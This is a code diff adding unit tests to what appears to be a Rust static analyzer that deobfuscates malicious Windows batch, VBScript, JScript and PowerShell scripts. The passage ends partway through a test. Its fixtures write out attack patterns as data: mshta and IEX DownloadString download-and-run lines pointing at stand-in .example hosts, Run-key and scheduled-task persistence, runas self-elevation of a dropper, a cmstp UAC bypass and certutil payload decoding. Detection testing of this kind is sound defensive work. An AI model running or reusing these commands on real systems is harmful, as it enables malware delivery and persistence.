@@ -382,6 +382,18 @@ mod lex_type_tests {
             length: Some(3),
         };
     }
+
+    #[test]
+    fn percent_tilde_path_search_lexes_env_qualifier() {
+        assert_eq!(
+            crate::lex::lex("%~$PATH:1"),
+            vec![Token::PercentTilde {
+                flags: PercentTildeFlags::default(),
+                path_search: Some("PATH".to_string()),
+                arg_index: 1
+            }]
+        );
+    }
 }
 
 #[cfg(test)]
@@ -570,7 +582,10 @@ mod echo_tests {
     use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
-    use crate::{analyze, Config as AnalyzeConfig};
+    use crate::{
+        analyze, echo_redirect_prescan_shapes, has_echo_redirect_prescan_shape,
+        Config as AnalyzeConfig,
+    };
     use base64::Engine;
 
     #[test]
@@ -615,6 +630,25 @@ mod echo_tests {
         assert_eq!(
             chunks,
             vec![b"first\r\n".as_slice(), b"second\r\n".as_slice()]
+        );
+    }
+
+    #[test]
+    fn redirected_bare_echo_records_current_echo_state_for_for_f() {
+        let script = b"@echo off\r\necho>tmp\r\nfor /F \"tokens=3\" %%i in ('type tmp') do if \"%%i\" EQU \"off.\" echo CONTINUE\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.deobfuscated.contains("echo CONTINUE"),
+            "FOR /F did not resolve redirected echo state, got:\n{}",
+            report.deobfuscated
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::IfNotResolved { condition } if condition.contains("%%i")
+            )),
+            "loop variable stayed unresolved: {:?}",
+            report.traits
         );
     }
 
@@ -671,6 +705,42 @@ if exist "%B64FILE%" del "%B64FILE%"
     }
 
     #[test]
+    fn echo_redirect_prescan_gate_allows_materialization_shapes() {
+        assert!(has_echo_redirect_prescan_shape(
+            b"(\r\necho SGVsbG8=\r\n) > out.b64\r\n"
+        ));
+        assert!(has_echo_redirect_prescan_shape(
+            b"echo SGVsbG8=>>out.b64\r\necho V29ybGQ=>>out.b64\r\n"
+        ));
+        assert!(!has_echo_redirect_prescan_shape(
+            b"set X=SGVsbG8=\r\necho %X%>out.b64\r\n"
+        ));
+    }
+
+    #[test]
+    fn echo_redirect_prescan_shapes_distinguish_block_from_run() {
+        let block = echo_redirect_prescan_shapes(b"(\r\necho SGVsbG8=\r\n) > out.b64\r\n");
+        assert!(block.grouped_block);
+        assert!(!block.top_level_run);
+
+        let run = echo_redirect_prescan_shapes(
+            b"echo SGVsbG8=>>out.b64\r\necho V29ybGQ=>>out.b64\r\nrem unrelated ( )\r\n",
+        );
+        assert!(!run.grouped_block);
+        assert!(run.top_level_run);
+    }
+
+    #[test]
+    fn echo_redirect_prescan_gate_blocks_unrelated_echo_text() {
+        assert!(!has_echo_redirect_prescan_shape(
+            b"echo URL is https://example.test/a > con\r\n"
+        ));
+        assert!(!has_echo_redirect_prescan_shape(
+            b"rem echo and > and ( ) appear in a comment\r\n"
+        ));
+    }
+
+    #[test]
     fn echo_inline_redirect_without_space_records_content() {
         let mut env = Environment::new(&Config::default());
         interpret_line("echo SGVsbG8=>payload.b64", &mut env);
@@ -716,6 +786,35 @@ if exist "%B64FILE%" del "%B64FILE%"
                 .iter()
                 .any(|t| matches!(t, Trait::CertutilDecode { src_resolved, .. } if *src_resolved)),
             "block-echo b64 should resolve the certutil source: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn block_prefix_redirect_writes_file_for_certutil_decode() {
+        use base64::Engine;
+
+        let b64 = base64::engine::general_purpose::STANDARD.encode(b"prefix redirect payload");
+        let (a, b) = b64.split_at(b64.len() / 2);
+        let script = format!(
+            "set \"tempB64File=%TEMP%\\embedded.b64\"\r\n\
+             set \"outputExe=%TEMP%\\embedded.exe\"\r\n\
+             > \"%tempB64File%\" (\r\n\
+             echo {a}\r\n\
+             echo {b}\r\n\
+             \r\n\
+             )\r\n\
+             certutil -decode \"%tempB64File%\" \"%outputExe%\"\r\n"
+        );
+
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::CertutilDecode { src_resolved, .. } if *src_resolved)),
+            "prefix-redirect block b64 should resolve the certutil source: {:?}",
             report.traits
         );
     }
@@ -801,14 +900,183 @@ if exist "%B64FILE%" del "%B64FILE%"
     }
 
     #[test]
+    fn ascii_case_insensitive_byte_gate_matches_script_tags() {
+        assert!(crate::contains_ascii_case_insensitive_bytes(
+            b"/* <SCRIPT language=\"JScript\"> */",
+            b"<script"
+        ));
+        assert!(crate::contains_ascii_case_insensitive_bytes(
+            b"</ScRiPt>",
+            b"</script>"
+        ));
+        assert!(!crate::contains_ascii_case_insensitive_bytes(
+            b"echo no embedded script here",
+            b"<script"
+        ));
+    }
+
+    #[test]
+    fn polyglot_vbscript_block_is_scanned_as_vbs() {
+        let script = br#"
+@echo off
+mshta "%~f0"
+exit /b
+<script language="VBScript">
+Dim cmd
+cmd = "mshta " & Chr(104) & "ttp://polyglot-vbs.example/payload.hta"
+Set sh = CreateObject("WScript.Shell")
+sh.Run cmd, 0, False
+</script>
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        let found = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, .. } if src == "http://polyglot-vbs.example/payload.hta"
+            )
+        });
+        assert!(
+            found,
+            "VBScript polyglot block was not scanned as VBS: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn standalone_script_prescan_ignores_batch_text_with_var_word() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::pre_scan_standalone_script_input(b"@echo off\r\n:: Ttylvar Lkimf\r\n", &mut env);
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "ordinary batch text was queued as script: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
+    fn standalone_script_prescan_ignores_echoed_js_inside_batch() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::pre_scan_standalone_script_input(
+            b"@echo off\r\necho.var shell = new ActiveXObject('WScript.Shell')\r\n",
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "echoed batch helper was queued as standalone script: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
+    fn standalone_script_prescan_ignores_direct_js_with_wscript() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::pre_scan_standalone_script_input(
+            br#"var sh = new ActiveXObject("WScript.Shell")
+sh.Run("powershell -Command Invoke-WebRequest https://direct-js.example/p")"#,
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "direct JScript was queued as standalone VBS: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
+    fn standalone_script_prescan_ignores_direct_js_function_with_wscript() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::pre_scan_standalone_script_input(
+            br#"function main() {
+var sh = new ActiveXObject("WScript.Shell");
+sh.Run("powershell -Command Invoke-WebRequest https://direct-js-function.example/p");
+}
+main();"#,
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "direct JScript function was queued as standalone script: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
+    fn standalone_script_prescan_ignores_direct_js_const_with_wscript() {
+        let mut env = Environment::new(&AnalyzeConfig::default());
+        crate::pre_scan_standalone_script_input(
+            br#"const sh = new ActiveXObject("WScript.Shell");
+sh.Run("powershell -Command Invoke-WebRequest https://direct-js-const.example/p");"#,
+            &mut env,
+        );
+        assert!(
+            env.all_extracted_jscript.is_empty() && env.all_extracted_vbs.is_empty(),
+            "direct JScript const was queued as standalone script: js={} vbs={}",
+            env.all_extracted_jscript.len(),
+            env.all_extracted_vbs.len()
+        );
+    }
+
+    #[test]
+    fn standalone_ps_scriptblock_create_literal_is_extracted_and_scanned() {
+        let script = concat!(
+            "&([scriptblock]::Create('",
+            "Invoke-WebRequest -Uri https://standalone-scriptblock.example/payload.ps1",
+            "'))"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|ps| ps.contains("https://standalone-scriptblock.example/payload.ps1")),
+            "scriptblock literal was not extracted as PS: {:?}\n{}",
+            report.extracted_ps1_normalized,
+            report.deobfuscated
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "https://standalone-scriptblock.example/payload.ps1"
+            )),
+            "scriptblock literal was not scanned as PS: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn start_quoted_url_is_extracted() {
         // `start "" "URL"` opens the URL in the default handler.
         let script = b"start \"\" \"https://opened.example/doc.pdf\"\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
         assert!(
             report.traits.iter().any(|t| matches!(t,
-                Trait::Download { src, .. } if src == "https://opened.example/doc.pdf")),
-            "start-quoted URL not extracted: {:?}",
+                Trait::UrlLaunch { url, .. } if url == "https://opened.example/doc.pdf")),
+            "start-quoted URL launch not extracted: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_quote_spliced_url_launch_collapses_empty_quote_pairs() {
+        let script =
+            br#"start "" "https://raw.githubuserc""o""ntent.c""o""m/example/repo/main/DOC.zip""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(t,
+                Trait::UrlLaunch { url, .. }
+                    if url == "https://raw.githubusercontent.com/example/repo/main/DOC.zip")),
+            "quote-spliced start URL launch not normalized: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(t,
+                Trait::UrlLaunch { url, .. } if url == "https://raw.githubuserc")),
+            "quote-spliced start URL launch was truncated: {:?}",
             report.traits
         );
     }
@@ -1227,6 +1495,192 @@ if exist "%B64FILE%" del "%B64FILE%"
     }
 
     #[test]
+    fn start_process_verb_runas_captures_abbreviated_argument_list() {
+        let script = b"@echo off\r\npowershell -Command \"Start-Process -FilePath powershell.exe -Args '-Command echo hi' -Verb RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" && args == "-Command echo hi"
+            )),
+            "abbreviated argument list SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_process_verb_runas_captures_abbreviated_file_path() {
+        let script = b"@echo off\r\npowershell -Command \"Start-Process -File powershell.exe -Args '-Command echo hi' -Verb RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" && args == "-Command echo hi"
+            )),
+            "abbreviated file path SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_process_verb_runas_captures_unquoted_argument_list() {
+        let script = b"@echo off\r\npowershell -Command \"Start-Process -FilePath powershell.exe -ArgumentList calc.exe -Verb RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" && args == "calc.exe"
+            )),
+            "unquoted argument list SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_process_verb_runas_captures_attached_file_and_arguments() {
+        let script = b"@echo off\r\npowershell -Command \"Start-Process -FilePath:powershell.exe -ArgumentList:calc.exe -Verb RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" && args == "calc.exe"
+            )),
+            "attached file/argument SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_process_verb_runas_captures_attached_short_file_and_arguments() {
+        let script =
+            b"@echo off\r\npowershell -Command \"Start-Process -F:powershell.exe -A:calc.exe -Verb RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" && args == "calc.exe"
+            )),
+            "attached short file/argument SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_process_verb_runas_captures_attached_verb() {
+        let script = b"@echo off\r\npowershell -Command \"Start-Process -FilePath:powershell.exe -ArgumentList:calc.exe -Verb:RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" && args == "calc.exe"
+            )),
+            "attached verb SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn start_process_verb_runas_preserves_distinct_args_for_same_target() {
+        let script = b"@echo off\r\npowershell -Command \"Start-Process -FilePath powershell.exe -ArgumentList calc.exe -Verb RunAs; Start-Process -FilePath powershell.exe -ArgumentList notepad.exe -Verb RunAs\"\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        let args: std::collections::BTreeSet<&str> = report
+            .traits
+            .iter()
+            .filter_map(|t| match t {
+                Trait::SelfElevation {
+                    target,
+                    args: Some(args),
+                } if target == "powershell.exe" => Some(args.as_str()),
+                _ => None,
+            })
+            .collect();
+        assert!(
+            args.contains("calc.exe") && args.contains("notepad.exe"),
+            "distinct SelfElevation args collapsed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn vbs_shell_execute_runas_emits_self_elevation_trait() {
+        let script = br#"Set UAC = CreateObject("Shell.Application")
+UAC.ShellExecute "cmd.exe", "/c ""C:\Users\me\dropper.bat""", "", "runas", 1"#;
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_vbs.push(script.to_vec());
+        crate::vbs_scan::scan_vbs_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args
+                            .as_deref()
+                            .is_some_and(|value| value.contains("dropper.bat"))
+            )),
+            "VBS ShellExecute runas SelfElevation not detected: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn echoed_vbs_shell_execute_runas_emits_self_elevation_trait() {
+        let script = br#"@echo off
+echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+echo UAC.ShellExecute "cmd.exe", "/c ""%~s0""", "", "runas", 1 >> "%temp%\getadmin.vbs""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args
+                            .as_deref()
+                            .is_some_and(|value| value.contains("%~s0"))
+            )),
+            "echoed VBS ShellExecute runas SelfElevation not detected: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn js_shell_execute_runas_emits_self_elevation_trait() {
+        let script = br#"WScript.CreateObject("Shell.Application").ShellExecute("cmd.exe", "/c C:\\Users\\me\\dropper.bat", "", "runas", 1);"#;
+        let mut env = crate::env::Environment::new(&crate::env::Config::default());
+        env.all_extracted_jscript.push(script.to_vec());
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::SelfElevation { target, args }
+                    if target == "cmd.exe"
+                        && args
+                            .as_deref()
+                            .is_some_and(|value| value.contains("dropper.bat"))
+            )),
+            "JS ShellExecute runas SelfElevation not detected: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn uac_policy_weakening_emits_uac_bypass_traits() {
         let script = b"@echo off\r\n\
             reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v \"EnableLUA\" /t REG_DWORD /d 0 /f\r\n\
@@ -1248,6 +1702,32 @@ if exist "%B64FILE%" del "%B64FILE%"
                 report.traits
             );
         }
+    }
+
+    #[test]
+    fn msconfig_exe_4_in_deob_text_emits_uac_bypass_trait() {
+        let mut env = crate::env::Environment::new(&AnalyzeConfig::default());
+        crate::deob_scan::scan_deob_text("msconfig.exe /4", &mut env);
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "msconfig-4")),
+            "msconfig.exe /4 was not surfaced in deob text: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn cmstp_au_after_other_flags_in_deob_text_emits_uac_bypass_trait() {
+        let mut env = crate::env::Environment::new(&AnalyzeConfig::default());
+        crate::deob_scan::scan_deob_text(r#"cmstp.exe /s /au C:\Users\Public\stage.inf"#, &mut env);
+        assert!(
+            env.traits
+                .iter()
+                .any(|t| matches!(t, Trait::UacBypass { technique } if technique == "cmstp-au")),
+            "cmstp /au after other flags was not surfaced in deob text: {:?}",
+            env.traits
+        );
     }
 
     #[test]
@@ -1276,6 +1756,69 @@ if exist "%B64FILE%" del "%B64FILE%"
             assert_eq!(value_name, "evil");
             assert!(command.contains("drop.exe"));
         }
+    }
+
+    #[test]
+    fn reg_add_run_key_recurses_into_persisted_download_command() {
+        let script = br#"@echo off
+setlocal DisableDelayedExpansion
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v updater /d "cmd /V:ON /c set U=https://reg-run.example/p.exe&&curl -o out.exe !U!" /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://reg-run.example/p.exe"
+                        && dst.as_deref() == Some("out.exe")
+            )),
+            "persisted Run-key command download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn reg_add_run_key_preserves_backslash_escaped_nested_quotes() {
+        let script = br##"@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "#One" /t REG_SZ /d "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://reg-quoted.example/p.ps1');\"" /f
+"##;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { command, .. }
+                    if command.contains("DownloadString")
+                        && command.contains("reg-quoted.example/p.ps1")
+            )),
+            "Run-key Persistence command was truncated: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn reg_add_run_key_does_not_recurse_incomplete_trailing_backslash_command() {
+        let script = br#"@echo off
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Reinforce /d "mshta.exe \" /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(
+                |t| matches!(t, Trait::Persistence { command, .. } if command == "mshta.exe \\")
+            ),
+            "Run-key persistence metadata missing: {:?}",
+            report.traits
+        );
+        assert!(
+            !report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::Mshta { cmd } if cmd == "mshta.exe \\")),
+            "incomplete Run-key data should not be recursively dispatched: {:?}",
+            report.traits
+        );
     }
 
     #[test]
@@ -1323,6 +1866,65 @@ reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v S
             assert_eq!(key, "VCC_runner2");
             assert!(command.contains("C:\\evil.exe"));
         }
+    }
+
+    #[test]
+    fn schtasks_create_xml_emits_persistence_xml_path() {
+        let script = br#"@echo off
+schtasks /create /tn office_get /xml C:\WINDOWS\office_get.xml /F
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, key, command, .. }
+                    if hive == "ScheduledTask"
+                        && key == "office_get"
+                        && command == "xml:C:\\WINDOWS\\office_get.xml"
+            )),
+            "ScheduledTask XML Persistence missing XML path: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn schtasks_create_tr_recurses_into_nested_download() {
+        let script = br#"@echo off
+setlocal DisableDelayedExpansion
+schtasks /create /tn "Updater" /tr "cmd /V:ON /c set U=https://schtasks.example/p.exe&&curl -o out.exe !U!" /sc once /st 00:00
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://schtasks.example/p.exe"
+                        && dst.as_deref() == Some("out.exe")
+            )),
+            "nested scheduled-task action download missing: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn schtasks_create_tr_preserves_backslash_escaped_nested_quotes() {
+        let script = br#"@echo off
+schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.WebClient).DownloadString('http://task-quoted.example/p.ps1');\"" /sc minute /mo 60 /f
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Persistence { hive, command, .. }
+                    if hive == "ScheduledTask"
+                        && command.contains("DownloadString")
+                        && command.contains("task-quoted.example/p.ps1")
+            )),
+            "ScheduledTask Persistence command was truncated: {:?}",
+            report.traits
+        );
     }
 
     #[test]
@@ -1403,6 +2005,21 @@ reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v S
                 Trait::DefenderEvasion { action, .. } if action == "taskkill-security-process"
             )),
             "generic taskkill should not be DefenderEvasion: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn encoded_delete_argument_does_not_emit_security_product_remove() {
+        let script = b"@echo off\r\n\
+            del /Q/y7M9xGPM3j2XhHgf0w4zHagLBfEMC1TdV4bp1b433LXCSeBRCAVGxz55NtXDPzMGP1yBeIDxfhab3qOrkSIPvOuoBQG1Mfv8KxjvXRb7TsNmN8h1lQN3yrN\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, .. } if action == "security-product-remove"
+            )),
+            "encoded delete argument should not be DefenderEvasion: {:?}",
             report.traits
         );
     }
@@ -1668,6 +2285,48 @@ reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v S
     }
 
     #[test]
+    fn wmic_system_inventory_emits_enumeration_trait() {
+        let script = b"@echo off\r\n\
+            wmic cpu get caption, name, deviceid, numberofcores, maxclockspeed, status >> userdata.txt\r\n\
+            wmic logicaldisk get name,deviceid,filesystem,freespace,size >> disklog.txt\r\n";
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "wmic-enum" && command.contains("wmic cpu get")
+            )),
+            "missing WMIC CPU enumeration: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "wmic-enum" && command.contains("wmic logicaldisk get")
+            )),
+            "missing WMIC logicaldisk enumeration: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn wmic_for_f_inventory_command_is_trimmed() {
+        let script = br#"for /f "tokens=3" %%a in ('wmic logicaldisk where "Size=250954240000" get Size | find "Size"') do echo %%a"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Enumeration { enum_kind, command }
+                    if enum_kind == "wmic-enum"
+                        && command == "wmic logicaldisk where \"Size=250954240000\" get Size | find \"Size\""
+            )),
+            "WMIC for/f enumeration command was not trimmed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn rdp_session_relaxation_emits_remote_access_traits() {
         let script = b"@echo off\r\n\
             reg add \"HKLM\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v \"AllowMultipleTSSessions\" /t REG_DWORD /d 0x1 /f\r\n\
@@ -1745,6 +2404,65 @@ reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v S
     }
 
     #[test]
+    fn appdomain_inmem_assembly_load_detected_in_extracted_ps_payload() {
+        // Some PS loaders avoid `[Reflection.Assembly]::Load` and call the
+        // equivalent AppDomain loader after building a byte array.
+        let body = "$payload=[byte[]](77,90,0,0); [System.AppDomain]::CurrentDomain.Load($payload)";
+        use base64::Engine as _;
+        let enc = base64::engine::general_purpose::STANDARD.encode(body.as_bytes());
+        let script = format!(
+            "@echo off\r\npowershell -Command \"$y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{enc}')); iex $y\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::InMemoryAssemblyLoad { variant } if variant == "AppDomain.Load"
+            )),
+            "AppDomain InMemoryAssemblyLoad not detected: traits={:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn dynamic_reflection_assembly_load_detected_in_extracted_ps_payload() {
+        let body = "$m='Load'; $payload=[byte[]](77,90,0,0); [System.Reflection.Assembly]::($m)([byte[]]$payload)";
+        use base64::Engine as _;
+        let enc = base64::engine::general_purpose::STANDARD.encode(body.as_bytes());
+        let script = format!(
+            "@echo off\r\npowershell -Command \"$y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{enc}')); iex $y\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::InMemoryAssemblyLoad { variant } if variant == "DynamicLoad"
+            )),
+            "dynamic Reflection.Assembly load not detected: traits={:?}",
+            report.traits
+        );
+    }
+
+    #[test]
+    fn custom_loadassembly_invocation_detected_in_extracted_ps_payload() {
+        let body = "$bytes=[byte[]](77,90,0,0); $asm=[DomainLoader]::LoadAssembly($bytes); $t=$asm.GetTypes()[0]; $m=$t.GetMethod('Run'); $m.Invoke($null,@())";
+        use base64::Engine as _;
+        let enc = base64::engine::general_purpose::STANDARD.encode(body.as_bytes());
+        let script = format!(
+            "@echo off\r\npowershell -Command \"$y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{enc}')); iex $y\"\r\n"
+        );
+        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::InMemoryAssemblyLoad { variant } if variant == "LoadAssembly"
+            )),
+            "custom LoadAssembly invocation not detected: traits={:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn lateral_movement_anti_recovery_probe_enum_traits() {
         let script = b"@echo off\r\n\
             psexec \\\\target.example -u admin -p pass cmd\r\n\
@@ -1787,6 +2505,32 @@ reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v S
         assert!(lm_tools.contains(&"psexec"));
         assert!(lm_tools.contains(&"wmic"));
         assert!(lm_tools.contains(&"Invoke-Command"));
+    }
+
+    #[test]
+    fn geoplugin_public_ip_lookup_emits_network_probe() {
+        let script = br#"@echo off
+for /f "tokens=1 delims=:" %%A in ('curl -# -k "http://www.geoplugin.net/php.gp?ip"') do set geo=%%A
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::NetworkProbe { probe_kind, target }
+                    if probe_kind == "ip-discovery" && target == "www.geoplugin.net"
+            )),
+            "geoplugin public-IP lookup was not typed as NetworkProbe: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ForUnresolvedSource { pipeline }
+                    if pipeline.contains("www.geoplugin.net/php.gp?ip")
+            )),
+            "geoplugin public-IP curl endpoint should synthesize a stable response: {:?}",
+            report.traits
+        );
     }
 
     #[test]
@@ -1988,8 +2732,8 @@ reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v S
         let report = analyze(script, &AnalyzeConfig::default());
         assert!(
             report.traits.iter().any(|t| matches!(t,
-                Trait::Download { src, .. } if src == "https://browser.example/x")),
-            "start-browser URL not extracted: {:?}",
+                Trait::UrlLaunch { url, .. } if url == "https://browser.example/x")),
+            "start-browser URL launch not extracted: {:?}",
             report.traits
         );
     }
@@ -2026,6 +2770,14 @@ mod cmd_tests {
         let mut env = Environment::new(&Config::default());
         interpret_line(r#"cmd.exe /v:on /c "set X=v&&echo !X!""#, &mut env);
         assert_eq!(env.exec_cmd, vec!["set X=v&&echo !X!".to_string()]);
+    }
+
+    #[test]
+    fn cmd_comspec_v_d_c_extracts() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"cmd %ComSpec% /V/D/c "set X=v&&echo !X!""#, &mut env);
+        assert_eq!(env.exec_cmd, vec!["set X=v&&echo !X!".to_string()]);
+        assert_eq!(env.exec_cmd_delayed, vec![true]);
     }
 }
 
@@ -2069,6 +2821,21 @@ mod positional_tests {
         let mut env = Environment::new(&Config::default());
         let out = normalize_to_string(&lex("%~1"), &mut env);
         assert_eq!(out, "");
+    }
+
+    #[test]
+    fn percent_tilde_path_search_resolves_call_arg_with_snapshot_where() {
